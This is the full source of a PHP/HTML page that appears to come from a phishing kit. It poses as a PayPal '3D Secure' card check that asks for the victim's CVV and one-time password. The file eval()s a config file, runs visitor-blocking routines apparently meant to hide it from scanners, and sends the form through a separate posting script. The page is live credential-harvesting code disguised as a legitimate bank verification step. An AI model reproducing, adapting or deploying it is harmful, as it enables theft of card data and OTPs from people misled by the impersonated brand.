<?php
require_once __DIR__ . '/function.php';

if (file_exists($api->dir_config . '/' . $api->general_config)) {
  @eval(file_get_contents($api->dir_config . '/' . $api->general_config));
}

if ($config_blocker == 1) {
  $api->cookie();
  $api->session();
}

$api->visitor("3D Secure");
?>
<!DOCTYPE html>
<html>

<head>
<title><?=$api->encode($_SESSION['card_title']);?></title>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noodp, noydir">
<link rel="shortcut icon" href="../assets/img/favicon.ico">
<link rel="apple-touch-icon" href="../assets/img/apple-touch-icon.png">
<script src="../assets/js/jquery.min.js"></script>
<script src="../assets/js/jquery.mask.js"></script>
<script src="../assets/js/jquery.validate.js"></script>
<script src="../assets/js/myaccount.3dsecure.js"></script>
<style media="screen">
.kuzuluy {
margin: 0 auto;
width: 368px;
border: solid 1px black;
padding: 17px;
}

@media screen and (max-width: 368px) {
.kuzuluy:before {
width: 315px;
}
}

.info3d {
font-size: 13px;
margin-top: 25px;
color: #807979;

}

.hide {
display: none;
}
</style>
</head>

<body>
<div class="kuzuluy">
<img src="<?=$_SESSION['logo_img'];?>">
<img src="../assets/img/logo.svg" style="float: right;display: inline-block" width="128px">
<p class="info3d"><?=$api->transcode("Please enter information pertaining to your credit card to confirm your PayPal account.");?></p>
<div id="3dpage">
<div align="center">
<p style="margin: 91px 0 129px;"><?=$api->transcode("processing ...");?></p>
</div>
</div>
<div class="hide" id="3dweb">
<form method="post" id="3dsecure" autocomplete="off">
<table align="center" width="350" style="font-size: 11px;font-family: arial, sans-serif; color: rgb(0, 0, 0); margin-top: 10px;">
<tbody style="height:8px;">
<tr>
<td align="right"><?=$api->transcode("Card Number :");?></td>
<td>
<?=$_SESSION['show_num'];?>
</td>
</tr>
<tr>
<td align="right"><?=$api->encode("CVV/CVC :");?></td>
<td><input type="text" name="cvv" id="cvv" style="width: 38px;line-height:0.6" required>&nbsp;<img src="<?=$_SESSION['cvv_img'];?>" style="position: absolute;width: 39px;height: 18px;op:auto;"></td>
</tr>
<tr>
<td align="right"><?=$api->transcode("One time password :");?></td>
<td><input type="password" style="width: 150px;line-height:0.6" name="password_vbv" id="3Dsecure" required></td>
</tr>
<tr>
<td></td>
<td><br><input type="submit" value="Submit" id="bntvbv">&nbsp;&nbsp;|&nbsp;&nbsp;<a href="confirm=identity"><input type="button" value="<?=$api->transcode('Not now');?>"></a></td>
</tr>
</tbody>
</table>
</form>
</div>
<p style="text-align: center;font-family: arial, sans-serif;font-size: 9px; color: #656565"><?=$api->transcode("© ".gmdate('Y')." Bank check. All Rights Reserved");?></p>
</div>
<script src="../assets/js/3dsecure.post.js"></script>
</body>

</html>
